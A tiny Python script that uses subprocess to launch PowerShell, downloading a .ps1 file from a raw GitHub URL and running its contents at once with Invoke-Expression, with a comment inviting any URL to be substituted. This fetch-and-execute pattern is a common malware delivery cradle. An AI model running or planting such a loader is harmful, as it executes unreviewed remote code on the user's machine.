import subprocess 


url = "https://raw.githubusercontent.com/hullebulle69/powershell/refs/heads/main/hello.ps1" # change to the file you want to fetch
cmd = f"powershell -Command \"Invoke-Expression (Invoke-WebRequest '{url}').Content\""
subprocess.run(cmd, shell=True)
